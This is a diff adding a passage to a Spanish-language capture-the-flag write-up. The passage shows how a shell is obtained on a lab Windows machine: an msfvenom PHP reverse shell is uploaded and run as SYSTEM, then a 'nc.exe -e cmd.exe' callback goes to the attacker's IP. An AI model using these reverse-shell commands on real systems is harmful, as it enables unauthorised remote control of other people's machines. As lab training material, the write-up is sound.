@@ -321,6 +321,54 @@ Nos logueamos con las credenciales validas y obtenemos acceso a una web que nos 
 
 ## Obtenemos Consola en la maquina victima
 
+Hemos conseguido ejecutar comandos a nivel de sistema en la maquina victima, por lo que la subida de ficheros a esta la realizaremos con el comando 'certutil'
+
+1)Creamos una reverse shell php 
+
+	┌──(root㉿kali)-[/home/…/ctf/try_ctf/iron_corp/contenido]
+	└─# msfvenom -p php/reverse_php LHOST=10.9.92.151 LPORT=1988 -o rshell.php
+	[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+	[-] No arch selected, selecting arch: php from the payload
+	No encoder specified, outputting raw payload
+	Payload size: 3022 bytes
+	Saved as: rshell.php
+ 
+2)Subimos rshell.php a la maquina victima con ayuda de burpsuite, necesitamos montar un server http para compartir rshell.php
+
+![image](https://github.com/Esevka/CTF/assets/139042999/dc669435-519b-4613-aefa-a9dac5109023)
+
+3)Ejecutamos rshell.php
+
+![image](https://github.com/Esevka/CTF/assets/139042999/b80e0916-601a-4fa8-9f12-622d088154a5)
+
+Obtenemos acceso a la maquina como  --> '''nt authority\system''' , ya podemos hacer lo que nos venga en gana.
+
+4)Vamos a subir a la maquina netcat para establecer una conexion mas estable, subiremos netcat del mismo modo que rshell.php
+
+nc64.exe --> https://github.com/int0x33/nc.exe/
+
+
+	┌──(root㉿kali)-[/home/…/ctf/try_ctf/iron_corp/contenido]
+	└─# rlwrap nc -lvnp 1988
+	listening on [any] 1988 ...
+	connect to [10.9.92.151] from (UNKNOWN) [10.10.80.141] 50302
+	nc.exe -e cmd.exe 10.9.92.151 2000
+
+![image](https://github.com/Esevka/CTF/assets/139042999/48191d62-a9cd-4f27-ab30-3a355212f117)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
     	
